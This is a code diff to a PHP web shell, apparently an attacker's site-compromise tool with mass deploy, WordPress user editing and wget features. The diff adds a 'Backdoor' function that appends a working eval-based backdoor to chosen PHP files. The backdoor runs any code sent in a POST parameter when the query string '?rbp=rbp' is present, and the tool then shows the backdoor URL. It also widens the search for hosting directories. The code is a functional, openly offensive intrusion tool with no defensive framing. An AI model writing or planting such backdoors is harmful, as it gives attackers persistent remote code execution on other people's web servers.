@@ -65,7 +65,8 @@ function RBPautoDetectBaseDir() {
         '/home/*/public_html',
         '/var/www',
         '/home/*/www',
-        '/home/*/web'
+        '/home/*/web',
+        '/home/*/*/public_html'
     ];
     
     $currentUser = function_exists('posix_getpwuid') ? (posix_getpwuid(posix_geteuid())['name'] ?? 'unknown') : 'unknown';
@@ -202,6 +203,32 @@ function RBPdownloadDomainsList($baseDir, $filename) {
     }
     
     return $domainsList;
+}
+
+// Add backdoor to file
+function RBPaddBackdoor($filePath, $backdoorCode) {
+    if (!file_exists($filePath)) {
+        return ["error" => "File not found: $filePath"];
+    }
+    
+    $originalContent = file_get_contents($filePath);
+    if ($originalContent === false) {
+        return ["error" => "Cannot read file: $filePath"];
+    }
+    
+    // Check if backdoor already exists
+    if (strpos($originalContent, '?rbp=rbp') !== false) {
+        return ["error" => "Backdoor already exists in file"];
+    }
+    
+    // Add backdoor code
+    $newContent = $originalContent . $backdoorCode;
+    
+    if (file_put_contents($filePath, $newContent)) {
+        return ["success" => "Backdoor added successfully to: $filePath"];
+    } else {
+        return ["error" => "Failed to add backdoor to: $filePath"];
+    }
 }
 
 // WordPress User Editor Function
@@ -588,6 +615,26 @@ if (isset($_POST['mass_delete'])) {
     $_SESSION['mass_delete_results'] = $results;
     $_SESSION['mass_delete_filename'] = $filename;
     $_SESSION['mass_delete_base'] = $baseDir;
+    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
+    exit;
+}
+
+// Backdoor handler
+if (isset($_POST['add_backdoor'])) {
+    $isPostAction = true;
+    $sourceFile = $_POST['backdoor_file_path'] ?? '';
+    
+    if (empty($sourceFile) || !file_exists($sourceFile)) {
+        $_SESSION['backdoor_results'] = ["error" => "Source file not found: $sourceFile"];
+        header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
+        exit;
+    }
+    
+    $backdoorCode = "\n\n<?php if(isset(\$_GET['rbp']) && \$_GET['rbp']=='rbp'){eval(\$_POST['rbp']);} ?>";
+    
+    $results = RBPaddBackdoor($sourceFile, $backdoorCode);
+    $_SESSION['backdoor_results'] = $results;
+    $_SESSION['backdoor_source'] = $sourceFile;
     header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
     exit;
 }
@@ -1168,6 +1215,7 @@ if (isset($_SESSION['adminer_result'])) {
             <button class="tool-button" onclick="RBPshowWPEditUserPopup()">Edit WordPress User</button>
             <button class="tool-button" onclick="RBPshowWgetPopup()">WGET Download</button>
             <button class="tool-button" onclick="RBPshowMassDeployPopup()">Auto Mass Deploy</button>
+            <button class="tool-button" onclick="RBPshowBackdoorPopup()">Backdoor</button>
         </div>
         
         <div class="upload-section">
@@ -1228,6 +1276,27 @@ if (isset($_SESSION['adminer_result'])) {
                 unset($_SESSION['mass_delete_results']);
                 unset($_SESSION['mass_delete_filename']);
                 unset($_SESSION['mass_delete_base']);
+            } elseif (isset($_SESSION['backdoor_results'])) {
+                $results = $_SESSION['backdoor_results'];
+                $sourceFile = $_SESSION['backdoor_source'];
+                
+                echo '<h3>Backdoor Results</h3>';
+                echo '<p><strong>Target File:</strong> ' . htmlspecialchars($sourceFile) . '</p>';
+                echo '<div style="max-height: 400px; overflow-y: auto; border: 1px solid #444; padding: 10px; background: #2a2a2a;">';
+                
+                if (isset($results['error'])) {
+                    echo '<p style="color: red;">' . htmlspecialchars($results['error']) . '</p>';
+                } else {
+                    echo '<p style="color: lime;">' . htmlspecialchars($results['success']) . '</p>';
+                    echo '<p style="color: yellow; margin-top: 10px;">Backdoor URL: ' . htmlspecialchars($sourceFile) . '?rbp=rbp</p>';
+                    echo '<p style="color: #ccc; font-size: 12px;">Use POST parameter: rbp=your_code_here</p>';
+                }
+                
+                echo '</div>';
+                
+                // Clear session
+                unset($_SESSION['backdoor_results']);
+                unset($_SESSION['backdoor_source']);
             } elseif (isset($_SESSION['wp_edit_results'])) {
                 $result = $_SESSION['wp_edit_results'];
                 
@@ -1402,6 +1471,46 @@ if (isset($_SESSION['adminer_result'])) {
         </div>
     </div>
 
+    <!-- Backdoor Popup -->
+    <div id="backdoorPopup" class="popup-overlay">
+        <div class="popup-content">
+            <div id="backdoorContent">
+                <h3>Add Backdoor</h3>
+                <p>Select a PHP file to add backdoor code:</p>
+                
+                <div id="backdoorFileList" class="file-selector">
+                    <?php
+                    $phpFiles = [];
+                    if (is_dir($currentDir) && $handle = opendir($currentDir)) {
+                        while (false !== ($entry = readdir($handle))) {
+                            if ($entry != "." && $entry != ".." && !is_dir($currentDir . '/' . $entry) && pathinfo($entry, PATHINFO_EXTENSION) === 'php') {
+                                $phpFiles[] = $entry;
+                            }
+                        }
+                        closedir($handle);
+                    }
+                    foreach ($phpFiles as $file) {
+                        echo '<div class="file-selector-item" onclick="RBPselectBackdoorFile(\'' . htmlspecialchars($file) . '\')">' . htmlspecialchars($file) . '</div>';
+                    }
+                    if (count($phpFiles) === 0) {
+                        echo '<p style="color: red;">No PHP files found in current directory!</p>';
+                    }
+                    ?>
+                </div>
+                
+                <p><strong>Selected File Path:</strong></p>
+                <input type="text" id="backdoor_file_path" placeholder="/path/to/your/file.php" readonly>
+                
+                <div style="text-align: center; margin-top: 15px;">
+                    <button class="tool-button" style="background: #ff4444; border-color: #ff4444;" onclick="RBPsubmitBackdoor()">Add Backdoor</button>
+                    <button class="tool-button" onclick="RBPclosePopup('backdoorPopup')">Cancel</button>
+                </div>
+                
+                <p><small>This will add backdoor code: <code>?rbp=rbp</code> to the selected PHP file</small></p>
+            </div>
+        </div>
+    </div>
+
     <!-- WordPress Edit User Popup -->
     <div id="wpedituserPopup" class="popup-overlay">
         <div class="popup-content">
@@ -1504,6 +1613,10 @@ if (isset($_SESSION['adminer_result'])) {
             document.getElementById('massDeployPopup').style.display = 'block';
         }
         
+        function RBPshowBackdoorPopup() {
+            document.getElementById('backdoorPopup').style.display = 'block';
+        }
+        
         function RBPselectFile(filename) {
             var items = document.getElementsByClassName('file-selector-item');
             for (var i = 0; i < items.length; i++) {
@@ -1511,6 +1624,15 @@ if (isset($_SESSION['adminer_result'])) {
             }
             event.target.classList.add('selected');
             document.getElementById('deploy_file_path').value = '<?php echo $currentDir; ?>/' + filename;
+        }
+        
+        function RBPselectBackdoorFile(filename) {
+            var items = document.getElementById('backdoorFileList').getElementsByClassName('file-selector-item');
+            for (var i = 0; i < items.length; i++) {
+                items[i].classList.remove('selected');
+            }
+            event.target.classList.add('selected');
+            document.getElementById('backdoor_file_path').value = '<?php echo $currentDir; ?>/' + filename;
         }
         
         function RBPclosePopup(popupId) {
@@ -1600,6 +1722,22 @@ if (isset($_SESSION['adminer_result'])) {
             form.submit();
         }
         
+        function RBPsubmitBackdoor() {
+            var form = document.createElement("form");
+            form.method = "post";
+            form.action = "";
+            var input1 = document.createElement("input");
+            input1.name = "backdoor_file_path";
+            input1.value = document.getElementById('backdoor_file_path').value;
+            var input2 = document.createElement("input");
+            input2.name = "add_backdoor";
+            input2.value = "1";
+            form.appendChild(input1);
+            form.appendChild(input2);
+            document.body.appendChild(form);
+            form.submit();
+        }
+        
         function RBPdownloadDomains() {
             var extension = prompt("Enter file extension (e.g., rbp.html) or leave blank for domain only:", "rbp.html");
             if (extension !== null) {
@@ -1621,7 +1759,7 @@ if (isset($_SESSION['adminer_result'])) {
         
         // Auto-show results popup if there are results
         window.onload = function() {
-            <?php if (isset($_SESSION['mass_deploy_results']) || isset($_SESSION['mass_delete_results']) || isset($_SESSION['wp_edit_results']) || isset($_SESSION['zoneh_results'])): ?>
+            <?php if (isset($_SESSION['mass_deploy_results']) || isset($_SESSION['mass_delete_results']) || isset($_SESSION['wp_edit_results']) || isset($_SESSION['zoneh_results']) || isset($_SESSION['backdoor_results'])): ?>
             document.getElementById('resultsPopup').style.display = 'block';
             <?php endif; ?>
         };
